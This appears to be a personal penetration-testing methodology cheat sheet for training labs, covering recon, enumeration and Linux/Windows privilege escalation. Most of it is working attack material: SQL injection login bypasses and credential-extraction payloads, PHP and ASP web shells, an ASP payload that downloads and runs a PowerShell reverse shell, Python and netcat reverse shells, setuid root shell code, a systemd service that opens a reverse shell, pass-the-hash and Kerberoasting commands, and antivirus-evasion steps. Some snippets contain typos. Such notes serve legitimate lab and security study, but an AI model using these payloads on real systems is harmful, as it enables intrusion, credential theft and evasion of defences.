# **RedsHortpaNts Pentest Methodology**


## **Passive Recon**

Reverse lookup subdomains
* http://reverse.report
* https://www.shodan.io
  



## **Enumeration**

---
> `autorecon IP`

> **nmap** 
>
>  * `nmap -sC -sV IP_ADDRESS`
>  * `nmap -sC -sV -p- IP_ADDRESS`
>  * `nmap -sU -sV --top-ports 20 IP_ADDRESS`
>  * `nmap --script vuln IP_ADDRESS`

> **Directory brute force**
>
> * `gobuster -u url -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x -t -f if ssl -k`
> * `./dirsearch.py -u -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -f -t`
    * if need recursive run dirbuster

> HTTP
>
> * token bypass
>   * if the login protect by CSRF token like this centreon_token=a7de878498705adc33ed0b1a6ea69e58
>   * try search for api login for that CMS
>   * `curl 10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=admin'`
>   * `wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403`
> * manually check url /robots.txt /admin /dev


>**SQL Injection**
>
> * **SQL Injection Login**
>   * ' or 1=1 LIMIT 1 --
>   * ' or 1=1 LIMIT 1 -- -
>   * ' or 1=1 LIMIT 1#
>   * 'or 1#
>   * ' or 1=1 --
>   * ' or 1=1 -- -
>* **UNION Attack**
>   * The `UNION` keyword lets you execute one or more additional `SELECT` queries and append the results to the original query
>     * `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
>     * Two requirements
>       * The individual queries must return the same number of columns.
>       * The data types in each column must be compatible between the individual queries
>     * One way to determine how amy columns are being returned from the original query
>       * `' ORDER BY 1--` increase the integer by one till we get any error for the column number is out of range
>     * Another way is submitting a series of `UNION SELECT` payloads specifying a different number of null values
>       * `' UNION SELECT NULL--` increase the null values `' UNION SELECT NULL,NULL--` till we get **no** error message
>     * After determined the number of columns we need, we can start test each column whether it can hold string data
>       * `' UNION SELECT 'a',NULL,NULL,NULL--` switch the position of `'a'`
>     * Example of extracting the username and password from a table
>       * `' UNION SELECT username, password FROM users--`
>     * Example of extracting version info from different databases
>       * **Oracle:** Determine the number of columns first, lets say two columns and the column contains string which is the first column
>       * Modify the `SELECT banner FROM v$version` to `'+UNION+SELECT+banner,NULL+FROM+v$version--`
>       * **MySQL and MSSQL:** Determine the number of columns first, lets say two columns and the column contains string which are both of the columns
>       * `'UNION SELECT @@version,'b'#`
> * **Extract data from database(Not Oracle)**
>   * Testing number of columns `'+UNION+SELECT+NULL,NULL--`
>   * Testing data type of columns `'+UNION+SELECT+'a','b'--`
>   * List all tables from schema `'+UNION+SELECT+table_name+,NULL+FROM+information_schema.tables--`
>   * List all column names from selected table `'+UNION+SELECT+column_name+,NULL+FROM+information_schema.columns+WHERE+table_name='users'--`
>   * Using the column names from the previous step `'+UNION+SELECT+username+,password+FROM+users`
>   * What if we only has one column? We can combine contents from two columns to one column by using `username || '~' || password`  
>   * `'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--`

> **PHP**
>
> * code execution
>   * `<?php echo shell_exec($_GET['RedsHort']); ?>`
>
>   * `<?php echo system($_GET["RedsHort"]);?>`
>
> * phpinfo LFI
>   * https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py
>   * ippsec poison video
> * 


> **ASP**
>
> * If the server not accepting any .asp file, try web.config with asp code in it. https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
> 
> * asp reverse shell 
>   * `<%
Set obj = CreateObject("WScript.Shell")
obj.Exec("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.62/Invoke-PowerShellTcp.ps1')")
%>`

> **DNS**
>
> * `host -l url RHOST`
>
> * `dig axfr url@IP`


> **SMB**
>
> * **smbclient**
>   * `smbclient --user=user //10.11.1.227/folder -R` to list all the files
>   * `download every file => recurse ON => prompt OFF => mget *`
>   * `smbclient -U=user%passwd //10.11.1.31/folder`
> * **smbmap**
>   * `smbmap -d domain -u username -p passwd -H 10.10.10.100 -R`
> * **SMB server:**
>       *  `smbserver.py share .`
> * **check permissions for smb directories:**
>   * `crackmapexec -u user.txt -p passwd.txt --share RHOST`
>   * `metasploit scanner/smb/smb_login provide user.txt and passwd.txt`
> * **executing file through SMB:**
>   * `\\LIP\SHARE\nc.exe -nv lhost 443 -e cmd.exe`
> * **SMB user enumerate:**
>   * `lookupsid.py user:passwd@10.10.10.149`
> * **Powershell connect to SMB:**
>   * `New-PSDrive -Name "share" -PSprovider "FileSystem" -Root "\\LHOST\share"`

> **RPC**
>
> * `rpcclient -U 'username%passwd' RHOST`
>   * useful feature lookupnames lookupsid
>   * for manually check usernames and sid
> * **evil-winrm windows shell:**
>   * if port 5985 is open
>   * `ruby evil-winrm.rb -i 10.10.10.149 -u username -p passwd`
>   * gci -recurse | select Fullname â‡’ list all files

> **SMTP**
>
> * mail log injection
>   * if we got LFI vulnerability to access to mail logs we can send the mail contains evil php code
>   * `MAIL FROM:<RedsHort@gmail.com>`
>   * `RCPT TO:<?php system($_GET['ed']); ?>`
>   * then use burp suite get shell
> * Dovecot
>   * `telnet IP port`
>   * `user username`
>   * `pass passwd`
>   * `list  list emails`
>   * `retr #  number for email`

> **WEB APPS**
>
> * phpmyadmin
>   * create a php file 
>     * `SELECT "<?php system($_GET['ed']); ?>" into outfile "/var/www/html/shell.php"`

> **SSH**
>
> * **dynamic port forwarding:**
>   * `ssh -D 1080 -Llport:127.0.0.1:rport user@10.10.10.84`
>   * make sure `/etc/proxychains.conf` set to `sock5 127.0.0.1 1080`




> **Useful Tolls**
>
> * **crack encrypted ssh key sshng2john.py:**
>   * `python sshng2john.py id_rsa > id_rsa.encrypted`
>   * `john id_rsa.encrypted --wordlist=/usr/share/wordlists/rockyou.txt`
> * **RSA decryp:t** <http://dann.com.br/alexctf2k17-crypto150-what_is_this_encryption/>
> * **zip file password crack:** 
>   * `fcrakzip -D -p wordlist file`
> * **cerw all words from a page**
>   * `cewl -d 2 -m 5 -w docswords.txt IP`
> * **keepass .dkbx file:**
>   * `keepass2john key.kdbx > key`
>   * `john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt key`
>   * `john --show key`
> * **authbind**
>   * authbind allows a program which does not or should not run as root to bind to low-numbered ports in a controlled way.
>   * `authbind python -m pyftpdlib -p21 -w`

> * **UDP**
>   * **reverse shell**
>     * `import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.14\", 443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])`
>     * `socat file:`tty`,echo=0,raw udp-listen:443`
>   * **OR**
>     * `nc -u LHOST LPORT`
>     * `nc -u -nvlp LPORT`
>   * **uncompile python compiled file**
>     * `pip install uncompyle`
>     * `uncompyle6 backup.py > backup.py`

## **Things to check when an exploit is not working out of box**

> * For example, an FTP exploit should copy sensitive files to the root directory of the webserver but we got permission denied. See if there any open port for remote file sharing like SMB or nfs. Try to copy the wanted files into places we have permissions.
> * If we can not upload payload into a web server. What if there is an SMB directory we have r/w permissions and the web page has RFI vulnerability. Then we can access the payload from SMB.
> * Check the certification for HTTPS, it may have the information we want like domain name, emails or subdomains.
>
> * If directory brute force not got what you want but you know the file name you looking for. Try wfuzz.
>   * `wfuzz -u http://10.10.10.10/FUZZ/filename -w /usr/share/wordlists/dirb/common.txt --hc=404`
> * Some times the user directory is not under `/home`
> * If some exploits need to setting up server on the target machine, try set the server listen on `0.0.0.0`
> * If we got a restricted shell like rbash can't do `ls`. Try `echo $PATH` then try copy paste the path then press Tab twice to list files under the path.
> * If GET is not getting any interesting response try other request method like POST.
> * Bypass CSRF token. Try google for api login for the target CMS.
> * If we can't `ls` or `cd` to a directory but we know there is a directory. Try just write the full path.
> * 


## **Privesc**

### **Linux**

> * `sudo -l`
> * run privilege checker
>   * `Linum.sh linpeas.sh linuxprivchecker.sh`
> * run `pspy32` or `pspy64` check for hidden cron jobs


> **Bash Related**
>
> * If the target don't like white space. `${IFS}` = white space in bash.

> **python related**
>
> * **check permissions of python lib**
>
> * **Injections**
>   * `os.system('ping ' + command)`
>     * we can inject the command as `$(bash /tmp/evil.sh)` even if the code has bad character checking feature

> **Useful code OR Commands**
>
> * setuid c file
>   * `gcc setuid.c -o RedsHort`
>
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main ( int argc, char *argv[] )
{
        setreuid(0,0);
        execve("/bin/sh", NULL, NULL);
}
```

or

```c
int main(void)
{
    setuid(0);
    setgit(0);
    system("/bin/bash")
}
```

>  * **Then**
>    * `chown root:root /tmp/RedsHort; chmod 4755 /tmp/RedsHort`
>    * You don't want put setuid file under directory with "nosuid" in fstab
> * **systemctl** 
>   * systemctl timer `watch -n 1 'systemctl list-timers'`



> **bash tricks**
>
> * use `$()` execute command
>   * root running a script but not sanitize the $, we can do `$(command)`
> 

> ***Service**
>
> * create a service
>
```
[Unit]
Description=RedsHort

[Service]
ExecStart=/bin/nc 10.10.10.10 9001 -e /bin/bash

[Install]
WantedBy=multi-user.target
```
>
> * `systemctl link /path/RedsHort.service`
> * `systemctl enable /path/RedsHort.service`
> * `service RedsHort start` or
> * `systemctl start /path/RedsHort`

> * **localhost:port**
>   * check if any interesting port listening on localhost


### **Windows**

> * **SeImersonatePrivilege**
>   * **jucie potato**
>     * CLSID: https://github.com/ohpe/juicy-potato/tree/master/CLSID
>     * `jp.exe -l 1337 -p C:\users\merlin\desktop\nc.exe -a " -nv 10.10.14.62 8081 -e cmd.exe" -t* -c "adminCLSID"`
>   * **rottenpotato**
>     * https://github.com/breenmachine/RottenPotatoNG
>     * `fullpath\lonelypotato.exe * payload.exe`

> * **NTLM Hash (All Impacket examples support hashes)**
>   * **Pass the hash**
>     * `pth-winexe -U Domain/user%hash --system //10.10.10.10 cmd.exe`
>       * <https://github.com/byt3bl33d3r/pth-toolkit>
>     * `wmiexec.py -hashes <==hash:hash==> user@RHOST`
>       * <https://github.com/SecureAuthCorp/impacket>
>     * Check hash login
>       * `crackmapexec RHOST -u user -H <==hash:hash==>`
>   * **Group Policy Preferences**
>     * `gpp-decrypt <==hash:hash==>`

> * **Kerbero** 
>   * `GetUserSPNs.py -request -dc-ip RHOST domain/user:passwd`
> * **Sharepoint**
>   * url show all items `/_layouts/viewlsts.aspx`

> * **Antimalware bypass:**
>   * Ebowla:  https://github.com/Genetic-Malware/Ebowla
>     * modify the genetic.config with type and computername
>     * `python ebowla.py evil.exe genetic.config`
>     * `./build_x64_go.sh  output/go_symmetric_evil.exe.go ebowla_evil.exe`
>     * then try it on virustotal.com
>   * Use msfvenom encode feature

> * **Powershell related:**
>   * Execution policy bypass
>     * `powershell -ep bypass`
>
>   * Run command as other user using powershell
>     * `$username = 'user';$password = 'passwd';$cred = $password | ConvertTo-SecureString -Force -AsPlainText;$credential = New-Object System.Management.Automation.PsCredential("$env:userdomain\$username",$cred);$session = New-PSSession -Credential $credential;`
>     * `Invoke-Command -Session $session -Script {command}`

> * **evil-winrm.rb if port 5985 is open**
>   * `ruby evil-winrm.rb -i RHOTST -u user -p passwd` 

> * **.dit file dump hash**
>    * `secretsdump.py -ntds /path/to/hash.dit -system /path/to/hash.bin`
